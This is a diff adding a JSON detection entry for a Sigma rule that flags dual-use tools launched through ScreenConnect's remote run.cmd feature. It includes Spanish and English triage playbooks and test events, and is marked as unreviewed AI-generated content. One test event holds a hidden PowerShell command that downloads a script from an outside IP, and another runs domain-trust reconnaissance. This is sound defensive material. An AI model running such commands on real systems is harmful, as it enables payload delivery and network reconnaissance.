@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
+    "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
+    "path": "windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1219.002"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un comando enviado de forma remota con la función de ejecución de ScreenConnect (run.cmd en C:\\Windows\\TEMP\\ScreenConnect\\) lanzó una utilidad de doble uso, como PowerShell, cmd, curl, bitsadmin, net, nltest, rundll32 o wevtutil. Puede ser soporte técnico legítimo o un atacante operando a través de la sesión remota.",
+      "what_it_detects": "Eventos de creación de procesos donde ParentCommandLine contiene ':\\Windows\\TEMP\\ScreenConnect\\' y 'run.cmd', e Image termina en bitsadmin, cmd, curl, dllhost, net, nltest, powershell, pwsh, rundll32 o wevtutil.",
+      "why_it_matters": "ScreenConnect da control remoto completo. Si un atacante roba credenciales o compromete el servidor, puede ejecutar comandos en silencio desde la consola (T1219.002, software de escritorio remoto) para reconocimiento, descarga de payloads o borrado de logs.",
+      "triage_steps": [
+        "Revise CommandLine del proceso hijo: busque descargas (curl, bitsadmin), PowerShell codificado, reconocimiento de dominio (nltest, net group) o borrado de eventos (wevtutil cl).",
+        "Abra el run.cmd indicado en ParentCommandLine, si aún existe, y obtenga el comando completo enviado desde la consola.",
+        "Identifique en los logs de auditoría del servidor ScreenConnect qué técnico, sesión e IP de origen enviaron el comando y compárelo con tickets de soporte.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos y nietos, conexiones de red, archivos nuevos en TEMP o ProgramData y servicios o tareas creadas.",
+        "Confirme si la instancia de ScreenConnect es la autorizada por la organización (servidor de relay, versión, ruta de instalación) o si se instaló hace poco.",
+        "Busque alertas previas para el mismo host, usuario y servidor ScreenConnect, y el mismo patrón en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts de soporte o mantenimiento enviados por técnicos autorizados que usan PowerShell, cmd o net; documéntelos y exclúyalos por contenido.",
+        "Proveedores MSP que ejecutan inventario o diagnóstico rutinario mediante comandos de ScreenConnect.",
+        "Soporte que limpia o exporta logs con wevtutil durante una incidencia documentada."
+      ],
+      "response_steps": [
+        "Valide con el equipo de soporte o el MSP si el comando corresponde a un ticket y técnico autorizados.",
+        "Si no está autorizado, aísle el endpoint y finalice la sesión de ScreenConnect; suspenda la cuenta del técnico o el acceso al servidor implicado.",
+        "Preserve run.cmd, los logs del servidor ScreenConnect y los artefactos descargados; calcule sus hash antes de cualquier limpieza.",
+        "Elimine payloads y persistencia identificados, aplique parches al servidor ScreenConnect, rote credenciales y restaure el acceso remoto solo tras la verificación."
+      ],
+      "severity_rationale": "Es media porque la ejecución remota de herramientas administrativas es común en soporte legítimo, pero también es una vía directa de abuso que requiere validación rápida."
+    },
+    "en": {
+      "summary": "A command pushed remotely through ScreenConnect's run-command feature (run.cmd under C:\\Windows\\TEMP\\ScreenConnect\\) launched a dual-use utility such as PowerShell, cmd, curl, bitsadmin, net, nltest, rundll32 or wevtutil. This may be legitimate support or an attacker operating through the remote session.",
+      "what_it_detects": "Process creation events where ParentCommandLine contains both ':\\Windows\\TEMP\\ScreenConnect\\' and 'run.cmd', and Image ends with bitsadmin, cmd, curl, dllhost, net, nltest, powershell, pwsh, rundll32 or wevtutil.",
+      "why_it_matters": "ScreenConnect grants full remote control. Stolen operator credentials or a compromised server let attackers silently run commands (T1219.002, remote desktop software) for reconnaissance, payload download or log clearing.",
+      "triage_steps": [
+        "Review the child CommandLine: look for downloads (curl, bitsadmin), encoded PowerShell, domain reconnaissance (nltest, net group) or event log clearing (wevtutil cl).",
+        "Open the run.cmd referenced in ParentCommandLine, if still present, to recover the full command sent from the console.",
+        "Use ScreenConnect server audit logs to identify the operator, session and source IP that sent the command; match against support tickets.",
+        "Pivot on the same host +/- 15 minutes: child and grandchild processes, network connections, new files in TEMP or ProgramData, new services or scheduled tasks.",
+        "Confirm the ScreenConnect instance is the organization's sanctioned one (relay server, version, install path) and not recently installed.",
+        "Search for earlier alerts on the same host, user and ScreenConnect server, and for the same pattern on other endpoints."
+      ],
+      "false_positives": [
+        "Support or maintenance scripts sent by authorized technicians that use PowerShell, cmd or net; document and exclude them by content.",
+        "MSPs running routine inventory or diagnostics through ScreenConnect commands.",
+        "Support staff exporting or clearing logs with wevtutil during a documented incident."
+      ],
+      "response_steps": [
+        "Confirm with the support team or MSP whether the command matches an authorized ticket and technician.",
+        "If unauthorized, isolate the endpoint, end the ScreenConnect session and suspend the operator account or server access involved.",
+        "Preserve run.cmd, ScreenConnect server logs and downloaded artifacts; record hashes before any cleanup.",
+        "Remove identified payloads and persistence, patch the ScreenConnect server, rotate credentials and restore remote access only after verification."
+      ],
+      "severity_rationale": "Medium fits because remote execution of admin tools is common in legitimate support, yet it is a direct abuse path that needs prompt validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "ScreenConnect run.cmd launches PowerShell to download a file",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c \"C:\\Windows\\TEMP\\ScreenConnect\\23.9.8.8811\\4f2a9c1e-7b3d-4e11-9a6f-0c2d8e5b7a10run.cmd\"",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"iwr http://203.0.113.25/update.ps1 -OutFile C:\\ProgramData\\update.ps1\""
+        }
+      },
+      {
+        "description": "ScreenConnect run.cmd launches nltest for domain reconnaissance",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c \"C:\\Windows\\TEMP\\ScreenConnect\\23.9.8.8811\\a81c55d2-1e90-4b7f-8c3a-55e0f1d2b6c4run.cmd\"",
+          "Image": "C:\\Windows\\System32\\nltest.exe",
+          "CommandLine": "nltest /domain_trusts /all_trusts"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Same ScreenConnect run.cmd parent but child is ipconfig.exe, not in the monitored list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c \"C:\\Windows\\TEMP\\ScreenConnect\\23.9.8.8811\\b3d7e9f0-2c41-4a8e-9f12-6d0e3c4b5a21run.cmd\"",
+          "Image": "C:\\Windows\\System32\\ipconfig.exe",
+          "CommandLine": "ipconfig /all"
+        }
+      },
+      {
+        "description": "PowerShell started by an IT script outside the ScreenConnect TEMP run.cmd path",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c \"C:\\IT\\Scripts\\inventory.cmd\"",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -File C:\\IT\\Scripts\\inventory.ps1"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
